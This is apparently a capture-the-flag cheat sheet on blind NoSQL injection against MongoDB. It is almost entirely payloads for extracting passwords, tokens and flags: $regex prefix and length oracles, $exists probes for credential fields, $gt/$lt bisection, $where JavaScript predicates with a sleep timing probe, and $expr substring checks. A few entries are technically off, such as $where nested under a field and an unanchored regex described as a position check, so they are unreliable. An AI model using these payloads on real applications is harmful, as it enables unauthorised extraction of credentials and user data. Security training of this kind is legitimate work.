# Extraction — char-by-char and field-discovery

## The `$regex` prefix-oracle — `^a` → `^ab` → `^abc`

```json
{"user": "admin", "pass": {"$regex": "^a"}}
{"user": "admin", "pass": {"$regex": "^ab"}}
{"user": "admin", "pass": {"$regex": "^abc"}}
```

`^a` — does the field start with `a`? — boolean oracle — char-by-char
extraction — `detection.md`.

## The char-set — the bounded alphabet

```text
a-z A-Z 0-9 {}_-
```

Flag-charset: `flag{...}` → `f`,`l`,`a`,`g`,`{`,then a-z0-9_- until `}` —
the bounded alphabet — the loop.

## The extraction loop — the prefix-walk

```text
1. ^a → true? → ^b? ...
2. when ^a matches → try ^aa, ^ab, ...
3. each char narrows by the alphabet-size → ~log2(36) probes per char
```

The binary-search or sequential — `detection.md`.

## The `$regex` with `\b`/`.` — the position-oracle

```json
{"pass": {"$regex": ".a"}}     — second char is a?
{"pass": {"$regex": "^.a"}}    — char at index 1 is a
{"pass": {"$regex": "^.{3}a"}} — char at index 3 is a
{"pass": {"$regex": "a$"}}     — ends with a
{"pass": {"$regex": "^.{5}$"}} — length 5
```

The position-oracle — `operators.md`.

## The length-oracle — `^.{N}$`

```json
{"pass": {"$regex": "^.{5}$"}}   — length 5
{"pass": {"$regex": "^.{1,10}$"}} — length ≤10
{"pass": {"$regex": "^.{20,}$"}}  — length ≥20
```

The length-oracle — the field's length — `detection.md`.

## The `$exists` field-discovery — `{"admin": {"$exists": true}}`

```json
{"admin": {"$exists": true}}
{"role": {"$exists": true}}
{"isAdmin": {"$exists": true}}
{"flag": {"$exists": true}}
{"secret": {"$exists": true}}
{"password": {"$exists": true}}
{"token": {"$exists": true}}
{"api_key": {"$exists": true}}
{"apiKey": {"$exists": true}}
{"private_key": {"$exists": true}}
{"salt": {"$exists": true}}
{"hash": {"$exists": true}}
{"2fa": {"$exists": true}}
{"otp": {"$exists": true}}
{"reset_token": {"$exists": true}}
{"session": {"$exists": true}}
{"email": {"$exists": true}}
{"username": {"$exists": true}}
{"_id": {"$exists": true}}
{"__v": {"$exists": true}}
{"createdAt": {"$exists": true}}
{"updatedAt": {"$exists": true}}
```

`$exists: true` — does the doc carry the field? — the field-discovery —
`operators.md`.

## The `$type` — the field-type oracle

```json
{"pass": {"$type": "string"}}
{"pass": {"$type": 2}}
{"age": {"$type": "number"}}
{"tags": {"$type": "array"}}
{"meta": {"$type": "object"}}
{"id": {"$type": "objectId"}}
{"active": {"$type": "bool"}}
{"created": {"$type": "date"}}
```

`$type` — the field's BSON-type — `operators.md`.

## The `$gt`/`$lt` range-oracle — `{$gt: "m"}`

```json
{"pass": {"$gt": "m"}}    — is pass > "m"? — the char > 'm'
{"pass": {"$lt": "m"}}    — is pass < "m"?
{"pass": {"$gte": "a", "$lt": "b"}}  — in [a, b)?
```

The range-oracle — a numeric/alphabetic bisection — `operators.md`.

## The `$regex` on `_id` — the ObjectId oracle

```json
{"_id": {"$regex": "^a"}}
```

`_id` is an ObjectId — `$regex` on it — the ObjectId-extraction —
`extraction-deep.md`.

## The `$where` extraction — JS predicates

```json
{"user": {"$where": "this.pass[0] == 'f'"}}
{"user": {"$where": "this.pass.length == 20"}}
{"user": {"$where": "this.pass.charCodeAt(0) == 102"}}
{"user": {"$where": "this.pass.startsWith('f')"}}
{"user": {"$where": "sleep(1000) || this.pass[0] == 'f'"}}
```

`$where` — the JS-predicate extraction — needs `enableJs` —
`operators-js.md`.

## The `$expr` — `$regexMatch` in find

```json
{"$expr": {"$regexMatch": {"input": "$pass", "regex": "^a"}}}
{"$expr": {"$eq": [{"$substr": ["$pass", 0, 1]}, "f"]}}
{"$expr": {"$eq": [{"$strLenCP": "$pass"}, 20]}}
{"$expr": {"$gt": [{"$strLenCP": "$pass"}, 10]}}
{"$expr": {"$eq": [{"$toUpper": "$pass"}, "FLAG{...}"]}}
{"$expr": {"$eq": [{"$substrCP": ["$pass", 0, 4]}, "flag"]}}
{"$expr": {"$eq": [{"$indexOfCP": ["$pass", "{"]}, 4]}}
```

`$expr` — the aggregation-operators inside `find()` — `aggregation.md`.

## The `$regex` on `flag` — the flag-field extraction

```json
{"flag": {"$regex": "^flag\\{"}}
{"flag": {"$regex": "^flag\\{a"}}
{"flag": {"$regex": "^flag\\{[a-z0-9_]+\\}$"}}
```

The `flag` field — the prefix-walk on `flag{...}` — `flag-extraction.md`.
